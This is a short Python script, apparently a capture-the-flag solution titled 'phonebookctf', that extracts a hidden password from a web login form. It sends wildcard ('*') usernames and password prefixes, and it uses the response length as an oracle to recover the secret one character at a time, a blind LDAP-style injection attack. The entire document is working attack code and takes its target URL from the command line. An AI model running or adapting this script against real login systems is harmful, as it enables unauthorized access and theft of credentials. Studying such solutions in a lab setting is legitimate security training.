import requests
import sys
def split(word):
    return [char for char in word]
charlist = split('''abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~`! @#$%^&()_-+={[}]|\:;"'<,>.?/ ''')
flag = []
try:
	url = sys.argv[1]
	while 1: 
			for char in charlist:
				data = {
					'username':'*',
					'password':''.join(flag)+char+'*'
					}
				r = requests.post(url,data)
				if len(r.text) == 2586:
					flag.append(char)
					print(f"found! {''.join(flag)}")
					break
				if char == ' ':
					flag = ''.join(flag)
					print(f'Final flag: {flag}')
					quit()
				else:
					print(char)
except:
	print('no valid url specified. Example: \n\npython3 phonebookctf.py http://site.to/hack\n')
